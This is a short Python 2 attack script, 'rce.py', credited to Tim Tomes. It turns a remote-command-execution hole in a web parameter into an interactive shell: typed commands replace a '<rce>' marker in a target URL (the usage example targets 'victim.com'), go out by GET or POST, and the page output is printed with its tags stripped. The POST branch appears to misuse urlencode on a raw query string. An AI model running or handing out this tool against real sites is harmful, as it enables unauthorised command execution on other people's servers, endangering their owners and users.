#!/usr/bin/python -tt

import sys, urllib, re, urlparse

def usage():
  print """
rce.py - Tim Tomes (@LaNMaSteR53) (www.lanmaster53.com)

Usage:
  ./rce.py [options] ur<rce>l
Options:
  -p    - Use POST method instead of GET. Enter url as GET.
  -h    - Help. This menu.
  <rce> - Location of vulnerable parameter.
Example:
  ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload.
  ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Parses the parameters from the url and sends the attack as a POST request, replacing '<rce>' with the payload.
  """
  sys.exit()

base_url = ''
for arg in sys.argv:
  if arg.find('://') != -1:
    base_url = arg
    break
if base_url == '': usage()
if '-h' in sys.argv:
  usage()
post = False
if '-p' in sys.argv:
  post = True

print "Type 'exit' to quit."

while True:
  cmd = raw_input("cmd> ")
  if cmd.lower() == 'exit': sys.exit(2)
  url = base_url.replace('<rce>', cmd)
  if post: 
    (ignore, ignore, ignore, params, ignore) = urlparse.urlsplit(url)
    site = url[:url.find(params)-1]
    result = urllib.urlopen(site, urllib.urlencode(params)).read()
  else:
    result = urllib.urlopen(url).read()
  result = re.sub("<\/*\w+?>", '', result)
  print '[*] Executed: %s\n%s' % (cmd, result)
